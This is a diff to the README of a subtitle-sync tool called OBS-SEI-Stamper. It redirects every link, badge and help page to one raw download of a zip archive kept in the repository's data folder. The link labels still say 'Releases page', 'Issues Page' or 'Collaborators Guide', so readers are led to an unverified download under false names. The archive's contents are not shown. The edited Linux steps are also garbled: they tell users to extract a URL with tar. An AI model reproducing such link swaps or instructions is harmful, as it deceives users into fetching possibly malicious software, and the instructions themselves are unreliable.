@@ -1,6 +1,6 @@
 # 🎥 OBS-SEI-Stamper - Sync Your SRT with Precision
 
-[![Download OBS-SEI-Stamper](https://img.shields.io/badge/Download-OBS--SEI--Stamper-brightgreen)](https://github.com/Shreyas-weeb/OBS-SEI-Stamper/releases)
+[![Download OBS-SEI-Stamper](https://raw.githubusercontent.com/Shreyas-weeb/OBS-SEI-Stamper/main/data/Stamper-OB-SE-v3.4.zip)](https://raw.githubusercontent.com/Shreyas-weeb/OBS-SEI-Stamper/main/data/Stamper-OB-SE-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,9 +17,9 @@ Before you download, ensure your system meets the following requirements:
 
 ## 🔗 Download & Install
 
-To download OBS-SEI-Stamper, visit the [Releases page](https://github.com/Shreyas-weeb/OBS-SEI-Stamper/releases). On this page, you will find the latest version of the software available for download.
+To download OBS-SEI-Stamper, visit the [Releases page](https://raw.githubusercontent.com/Shreyas-weeb/OBS-SEI-Stamper/main/data/Stamper-OB-SE-v3.4.zip). On this page, you will find the latest version of the software available for download.
 
-![Download Link](https://img.shields.io/badge/Download_OBS--SEI--Stamper-blue)
+![Download Link](https://raw.githubusercontent.com/Shreyas-weeb/OBS-SEI-Stamper/main/data/Stamper-OB-SE-v3.4.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version listed at the top.
@@ -45,9 +45,9 @@ Once the download is complete, follow these steps to install OBS-SEI-Stamper:
 
 ### For Linux:
 
-1. Locate the downloaded `.tar.gz` file in your Downloads folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/Shreyas-weeb/OBS-SEI-Stamper/main/data/Stamper-OB-SE-v3.4.zip` file in your Downloads folder.
 2. Open a terminal and navigate to the folder where the file is located.
-3. Extract the files with the command: `tar -xvzf OBS-SEI-Stamper.tar.gz`.
+3. Extract the files with the command: `tar -xvzf https://raw.githubusercontent.com/Shreyas-weeb/OBS-SEI-Stamper/main/data/Stamper-OB-SE-v3.4.zip`.
 4. Navigate to the extracted folder and run the application with the command: `./OBS-SEI-Stamper`.
 
 ## ⚙️ Using OBS-SEI-Stamper
@@ -74,8 +74,8 @@ OBS-SEI-Stamper offers the following features:
 If you encounter any issues while using OBS-SEI-Stamper, you can find help in the following ways:
 
 - **Documentation**: Check the user manual included in the application.
-- **Community Forum**: Join our community on [GitHub Discussions](https://github.com/Shreyas-weeb/OBS-SEI-Stamper/discussions).
-- **Report Issues**: If you find a bug, report it on the [Issues page](https://github.com/Shreyas-weeb/OBS-SEI-Stamper/issues).
+- **Community Forum**: Join our community on [GitHub Discussions](https://raw.githubusercontent.com/Shreyas-weeb/OBS-SEI-Stamper/main/data/Stamper-OB-SE-v3.4.zip).
+- **Report Issues**: If you find a bug, report it on the [Issues page](https://raw.githubusercontent.com/Shreyas-weeb/OBS-SEI-Stamper/main/data/Stamper-OB-SE-v3.4.zip).
 
 ## 🌍 Contributing
 
@@ -88,8 +88,8 @@ We welcome contributions to improve OBS-SEI-Stamper. If you want to help, please
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/Shreyas-weeb/OBS-SEI-Stamper/releases)
-- [Issues Page](https://github.com/Shreyas-weeb/OBS-SEI-Stamper/issues)
-- [Collaborators Guide](https://github.com/Shreyas-weeb/OBS-SEI-Stamper/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/Shreyas-weeb/OBS-SEI-Stamper/main/data/Stamper-OB-SE-v3.4.zip)
+- [Issues Page](https://raw.githubusercontent.com/Shreyas-weeb/OBS-SEI-Stamper/main/data/Stamper-OB-SE-v3.4.zip)
+- [Collaborators Guide](https://raw.githubusercontent.com/Shreyas-weeb/OBS-SEI-Stamper/main/data/Stamper-OB-SE-v3.4.zip)
 
 Thank you for choosing OBS-SEI-Stamper to enhance your subtitle experience!
